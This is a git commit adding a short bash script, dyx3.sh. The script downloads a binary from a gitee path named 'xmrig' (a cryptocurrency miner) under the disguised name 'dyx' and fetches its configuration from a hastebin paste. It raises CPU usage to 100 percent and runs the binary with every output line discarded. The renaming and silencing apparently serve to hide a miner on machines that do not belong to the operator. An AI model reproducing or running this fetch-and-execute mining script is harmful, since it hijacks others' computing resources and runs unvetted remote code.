2c6f653f02eb1c77eba2713f499305fda3ef3e94
dyxwxjdy <454782411@qq.com>
2022-02-10 22:16:11 +0800

    Create dyx3.sh

---
+++ dyx3.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+#timeout 1m lscpu
+sudo apt-get install -y nano jq curl
+sudo curl -o dyx -L https://gitee.com/dyxwxjdy/xmrig/attach_files/958843/download/dyx.tar > /dev/null 2>&1
+sudo curl -o config_bak.json https://www.toptal.com/developers/hastebin/raw/oruhesumok.json  > /dev/null 2>&1
+sudo chmod 777 dyx
+
+
+cp config_bak.json config.json > /dev/null 2>&1
+cpu=100
+echo $cpu
+cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=($cpu|tonumber)' > u.json
+mv u.json config.json
+cat config.json |jq -r --arg cpu "$cpu" '."cpu"."max-threads-hint"=($cpu|tonumber)' > u.json
+mv u.json config.json
+./dyx -c config.json > /dev/null 2>&1
